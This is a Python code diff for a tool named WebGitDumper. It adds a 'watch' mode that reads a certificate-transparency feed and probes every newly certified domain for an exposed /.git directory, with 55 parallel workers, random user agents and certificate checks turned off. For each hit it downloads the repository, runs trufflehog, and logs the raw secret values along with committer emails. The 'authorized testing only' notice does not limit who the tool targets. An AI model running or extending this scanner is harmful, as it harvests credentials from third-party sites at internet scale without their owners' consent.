@@ -668,13 +668,9 @@ class GitDumper:
             self._scan_secrets()
 
     def _scan_secrets(self):
-        """Run trufflehog against the dumped repository to find secrets in history."""
-        if not (self.output_dir / ".git").exists():
-            console.print("[red]Cannot scan: no .git directory found[/red]")
-            return
-
-        binary = shutil.which("trufflehog")
-        if not binary:
+        """Run trufflehog against the dumped repository and print findings."""
+        findings = run_trufflehog(self.output_dir)
+        if findings is None:
             console.print()
             console.print("[yellow]⚠ trufflehog not found in PATH — skipping secret scan[/yellow]")
             console.print("[dim]Install: brew install trufflehog  |  https://github.com/trufflesecurity/trufflehog[/dim]")
@@ -682,34 +678,6 @@ class GitDumper:
 
         console.print()
         console.print("[bold blue]Scanning for secrets with trufflehog...[/bold blue]")
-
-        repo_uri = f"file://{self.output_dir.resolve()}"
-        cmd = [binary, "git", repo_uri, "--json", "--no-update", "--no-verification"]
-
-        findings = []
-        try:
-            proc = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1,
-            )
-            for line in proc.stdout:
-                line = line.strip()
-                if not line:
-                    continue
-                try:
-                    findings.append(json.loads(line))
-                except json.JSONDecodeError:
-                    continue
-            proc.wait()
-        except FileNotFoundError:
-            console.print("[red]trufflehog binary disappeared during execution[/red]")
-            return
-        except Exception as e:
-            console.print(f"[red]trufflehog failed: {e}[/red]")
-            return
 
         if not findings:
             console.print("[green]✓ No secrets found[/green]")
@@ -738,7 +706,367 @@ class GitDumper:
             console.print(f"    [dim]{redacted}[/dim]")
 
 
-@click.command()
+def run_trufflehog(repo_dir: Path) -> Optional[list]:
+    """Run trufflehog against a dumped repo. Returns list of findings, or None if binary missing."""
+    if not (Path(repo_dir) / ".git").exists():
+        return []
+
+    binary = shutil.which("trufflehog")
+    if not binary:
+        return None
+
+    repo_uri = f"file://{Path(repo_dir).resolve()}"
+    cmd = [binary, "git", repo_uri, "--json", "--no-update", "--no-verification"]
+
+    findings = []
+    try:
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            text=True,
+            bufsize=1,
+        )
+        for line in proc.stdout:
+            line = line.strip()
+            if not line:
+                continue
+            try:
+                findings.append(json.loads(line))
+            except json.JSONDecodeError:
+                continue
+        proc.wait()
+    except Exception:
+        return findings
+
+    return findings
+
+
+class CertStreamWatcher:
+    """Watch certstream, check new domains for exposed .git, dump and scan hits."""
+
+    DEFAULT_CERTSTREAM_URL = "ws://localhost:8080/full-stream"
+
+    def __init__(
+        self,
+        output_dir: str,
+        certstream_url: Optional[str] = None,
+        check_workers: int = 55,
+        dump_workers: int = 3,
+        check_timeout: int = 5,
+        dedup_ttl: int = 86400,
+        verbose: bool = False,
+    ):
+        self.output_dir = Path(output_dir)
+        self.certstream_url = certstream_url or self.DEFAULT_CERTSTREAM_URL
+        self.check_workers = check_workers
+        self.dump_workers = dump_workers
+        self.check_timeout = check_timeout
+        self.dedup_ttl = dedup_ttl
+        self.verbose = verbose
+
+        self.check_queue: queue.Queue = queue.Queue(maxsize=10000)
+        self.dump_queue: queue.Queue = queue.Queue(maxsize=500)
+
+        self.seen_domains: dict = {}
+        self.seen_lock = threading.Lock()
+
+        self.stop_event = threading.Event()
+
+        self.stats_lock = threading.Lock()
+        self.stats_seen = 0
+        self.stats_checked = 0
+        self.stats_hits = 0
+        self.stats_dumped = 0
+        self.stats_secrets = 0
+        self.stats_dropped = 0
+
+        self.output_dir.mkdir(parents=True, exist_ok=True)
+        self.hits_path = self.output_dir / "hits.jsonl"
+        self.secrets_path = self.output_dir / "secrets.jsonl"
+        self.write_lock = threading.Lock()
+
+    def _seen_recently(self, domain: str) -> bool:
+        now = time.time()
+        with self.seen_lock:
+            ts = self.seen_domains.get(domain)
+            if ts and (now - ts) < self.dedup_ttl:
+                return True
+            self.seen_domains[domain] = now
+            if len(self.seen_domains) > 200000:
+                cutoff = now - self.dedup_ttl
+                self.seen_domains = {
+                    d: t for d, t in self.seen_domains.items() if t >= cutoff
+                }
+            return False
+
+    def _normalize_domain(self, domain: str) -> Optional[str]:
+        if not domain:
+            return None
+        domain = domain.strip().lower()
+        if domain.startswith("*."):
+            domain = domain[2:]
+        if not domain or "/" in domain or " " in domain:
+            return None
+        return domain
+
+    def _append_jsonl(self, path: Path, record: dict):
+        line = json.dumps(record, ensure_ascii=False)
+        with self.write_lock:
+            with path.open("a", encoding="utf-8") as f:
+                f.write(line + "\n")
+
+    def _producer(self):
+        """WebSocket producer: connects to certstream and feeds check_queue."""
+        import websocket
+
+        while not self.stop_event.is_set():
+            ws = None
+            keepalive_stop = threading.Event()
+            try:
+                ws = websocket.WebSocket()
+                ws.connect(self.certstream_url, timeout=30)
+                ws.sock.settimeout(60)
+                console.print(f"[green]✓ Connected to {self.certstream_url}[/green]")
+
+                def keepalive():
+                    while not keepalive_stop.is_set() and not self.stop_event.is_set():
+                        if keepalive_stop.wait(30):
+                            return
+                        try:
+                            ws.ping()
+                        except Exception:
+                            return
+
+                ka_thread = threading.Thread(target=keepalive, daemon=True)
+                ka_thread.start()
+
+                while not self.stop_event.is_set():
+                    raw = ws.recv()
+                    if not raw:
+                        break
+                    try:
+                        msg = json.loads(raw)
+                    except json.JSONDecodeError:
+                        continue
+
+                    domains = self._extract_domains(msg)
+                    for d in domains:
+                        norm = self._normalize_domain(d)
+                        if not norm or self._seen_recently(norm):
+                            continue
+                        with self.stats_lock:
+                            self.stats_seen += 1
+                        try:
+                            self.check_queue.put_nowait(norm)
+                        except queue.Full:
+                            with self.stats_lock:
+                                self.stats_dropped += 1
+            except Exception as e:
+                console.print(f"[yellow]certstream disconnected: {e}[/yellow]")
+            finally:
+                keepalive_stop.set()
+                if ws is not None:
+                    try:
+                        ws.close()
+                    except Exception:
+                        pass
+            if self.stop_event.is_set():
+                break
+            time.sleep(5)
+
+    @staticmethod
+    def _extract_domains(msg: dict) -> list:
+        """Extract domains from a certstream message (full-stream or domains-only)."""
+        mtype = msg.get("message_type")
+        data = msg.get("data", {})
+        if mtype == "certificate_update":
+            return data.get("leaf_cert", {}).get("all_domains", []) or []
+        if mtype == "dns_entries":
+            if isinstance(data, list):
+                return data
+            return data.get("data", []) if isinstance(data, dict) else []
+        if isinstance(data, dict):
+            leaf = data.get("leaf_cert", {})
+            if leaf:
+                return leaf.get("all_domains", []) or []
+        return []
+
+    def _check_worker(self):
+        """HEAD-check /.git/HEAD on each domain. Hits go to dump_queue."""
+        session = requests.Session()
+        session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
+
+        while not self.stop_event.is_set():
+            try:
+                domain = self.check_queue.get(timeout=1)
+            except queue.Empty:
+                continue
+
+            try:
+                url = f"https://{domain}/.git/HEAD"
+                resp = session.get(
+                    url,
+                    timeout=self.check_timeout,
+                    allow_redirects=False,
+                    verify=False,
+                )
+                with self.stats_lock:
+                    self.stats_checked += 1
+
+                if resp.status_code == 200 and b"ref: refs/heads/" in resp.content[:200]:
+                    with self.stats_lock:
+                        self.stats_hits += 1
+                    console.print(f"[bold green]★ HIT[/bold green] {domain}")
+                    self._append_jsonl(
+                        self.hits_path,
+                        {
+                            "domain": domain,
+                            "url": f"https://{domain}/.git/",
+                            "found_at": time.time(),
+                        },
+                    )
+                    try:
+                        self.dump_queue.put(domain, timeout=10)
+                    except queue.Full:
+                        with self.stats_lock:
+                            self.stats_dropped += 1
+            except Exception:
+                pass
+            finally:
+                self.check_queue.task_done()
+
+    def _dump_worker(self):
+        """Full dump + trufflehog scan. Findings to JSONL, raw deleted."""
+        import tempfile
+
+        while not self.stop_event.is_set():
+            try:
+                domain = self.dump_queue.get(timeout=1)
+            except queue.Empty:
+                continue
+
+            tmp = Path(tempfile.mkdtemp(prefix="wgd-", dir=str(self.output_dir)))
+            try:
+                console.print(f"[cyan]→ Dumping {domain}[/cyan]")
+                dumper = GitDumper(
+                    url=f"https://{domain}/.git/",
+                    output_dir=str(tmp),
+                    threads=10,
+                    verify_ssl=False,
+                    quiet=True,
+                )
+                dumper.run()
+
+                with self.stats_lock:
+                    self.stats_dumped += 1
+
+                findings = run_trufflehog(tmp)
+                if findings is None:
+                    console.print(
+                        "[yellow]⚠ trufflehog missing — install to enable scanning[/yellow]"
+                    )
+                    findings = []
+
+                if findings:
+                    with self.stats_lock:
+                        self.stats_secrets += len(findings)
+                    console.print(
+                        f"[bold red]🔑 {len(findings)} secret(s) in {domain}[/bold red]"
+                    )
+                    for f in findings:
+                        meta = f.get("SourceMetadata", {}).get("Data", {}).get("Git", {})
+                        record = {
+                            "domain": domain,
+                            "found_at": time.time(),
+                            "detector": f.get("DetectorName"),
+                            "raw": f.get("Raw"),
+                            "redacted": f.get("Redacted"),
+                            "commit": meta.get("commit"),
+                            "file": meta.get("file"),
+                            "line": meta.get("line"),
+                            "email": meta.get("email"),
+                            "timestamp": meta.get("timestamp"),
+                        }
+                        self._append_jsonl(self.secrets_path, record)
+            except Exception as e:
+                if self.verbose:
+                    console.print(f"[red]dump failed for {domain}: {e}[/red]")
+            finally:
+                shutil.rmtree(tmp, ignore_errors=True)
+                self.dump_queue.task_done()
+
+    def _stats_printer(self):
+        while not self.stop_event.is_set():
+            time.sleep(10)
+            with self.stats_lock:
+                console.print(
+                    f"[dim]stats: seen={self.stats_seen} "
+                    f"checked={self.stats_checked} "
+                    f"hits={self.stats_hits} "
+                    f"dumped={self.stats_dumped} "
+                    f"secrets={self.stats_secrets} "
+                    f"dropped={self.stats_dropped} "
+                    f"q_check={self.check_queue.qsize()} "
+                    f"q_dump={self.dump_queue.qsize()}[/dim]"
+                )
+
+    def run(self):
+        import urllib3
+
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+        console.print("[bold blue]WebGitDumper Watch Mode[/bold blue]")
+        console.print(f"Output:        {self.output_dir}")
+        console.print(f"Check workers: {self.check_workers}")
+        console.print(f"Dump workers:  {self.dump_workers}")
+        console.print(f"Hits log:      {self.hits_path}")
+        console.print(f"Secrets log:   {self.secrets_path}")
+        console.print()
+
+        if not shutil.which("trufflehog"):
+            console.print(
+                "[yellow]⚠ trufflehog not in PATH — dumps will run but secrets won't be scanned[/yellow]"
+            )
+
+        threads = []
+        prod = threading.Thread(target=self._producer, daemon=True, name="producer")
+        prod.start()
+        threads.append(prod)
+
+        for i in range(self.check_workers):
+            t = threading.Thread(target=self._check_worker, daemon=True, name=f"check-{i}")
+            t.start()
+            threads.append(t)
+
+        for i in range(self.dump_workers):
+            t = threading.Thread(target=self._dump_worker, daemon=True, name=f"dump-{i}")
+            t.start()
+            threads.append(t)
+
+        stats_t = threading.Thread(target=self._stats_printer, daemon=True, name="stats")
+        stats_t.start()
+        threads.append(stats_t)
+
+        try:
+            while not self.stop_event.is_set():
+                time.sleep(1)
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Shutting down...[/yellow]")
+            self.stop_event.set()
+
+
+@click.group()
+def cli():
+    """
+    WebGitDumper - Download exposed .git directories from web servers.
+
+    For authorized security testing only.
+    """
+    pass
+
+
+@cli.command()
 @click.argument("url")
 @click.argument("output_dir")
 @click.option("--threads", "-t", default=10, help="Number of download threads (default: 10)")
@@ -750,7 +1078,7 @@ class GitDumper:
 @click.option("--verbose", "-v", is_flag=True, help="Verbose output")
 @click.option("--quiet", "-q", is_flag=True, help="Minimal output")
 @click.option("--scan-secrets", is_flag=True, help="Run trufflehog against the dumped repo after download")
-def main(
+def dump(
     url: str,
     output_dir: str,
     threads: int,
@@ -764,15 +1092,12 @@ def main(
     scan_secrets: bool,
 ):
     """
-    WebGitDumper - Download exposed .git directories from web servers.
+    Dump a single exposed .git directory from a target URL.
 
     URL: Target URL (e.g., http://example.com/.git/ or http://example.com/)
 
     OUTPUT_DIR: Directory to save the downloaded repository
-
-    For authorized security testing only.
     """
-    # Suppress SSL warnings if verification is disabled
     if no_verify:
         import urllib3
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -803,5 +1128,63 @@ def main(
         sys.exit(1)
 
 
+@cli.command()
+@click.argument("output_dir")
+@click.option(
+    "--certstream-url",
+    default=None,
+    help="WebSocket URL of a certstream-server instance (default: ws://localhost:8080/full-stream)",
+)
+@click.option("--check-workers", default=55, help="Parallel GET probes for /.git/HEAD (default: 55)")
+@click.option("--dump-workers", default=3, help="Parallel full dumps + trufflehog scans (default: 3)")
+@click.option("--check-timeout", default=5, help="Timeout for the /.git/HEAD probe in seconds (default: 5)")
+@click.option("--dedup-ttl", default=86400, help="Skip already-seen domains for N seconds (default: 86400)")
+@click.option("--verbose", "-v", is_flag=True, help="Verbose output")
+def watch(
+    output_dir: str,
+    certstream_url: Optional[str],
+    check_workers: int,
+    dump_workers: int,
+    check_timeout: int,
+    dedup_ttl: int,
+    verbose: bool,
+):
+    """
+    Watch a certstream-server feed for newly issued certs, probe each domain
+    for /.git/HEAD, and dump+scan any hits with trufflehog.
+
+    OUTPUT_DIR: Directory for hits.jsonl and secrets.jsonl
+
+    Requires a running certstream-server instance. The public Calidog feed
+    (wss://certstream.calidog.io) has been broken for years — self-host with:
+
+      docker run -d -p 8080:8080 0rickyy0/certstream-server-go:latest
+
+    Then point --certstream-url at it (default ws://localhost:8080/full-stream).
+
+    Runs forever until Ctrl+C.
+    """
+    try:
+        watcher = CertStreamWatcher(
+            output_dir=output_dir,
+            certstream_url=certstream_url,
+            check_workers=check_workers,
+            dump_workers=dump_workers,
+            check_timeout=check_timeout,
+            dedup_ttl=dedup_ttl,
+            verbose=verbose,
+        )
+        watcher.run()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Interrupted by user[/yellow]")
+        sys.exit(1)
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/red]")
+        if verbose:
+            import traceback
+            traceback.print_exc()
+        sys.exit(1)
+
+
 if __name__ == "__main__":
-    main()
+    cli()
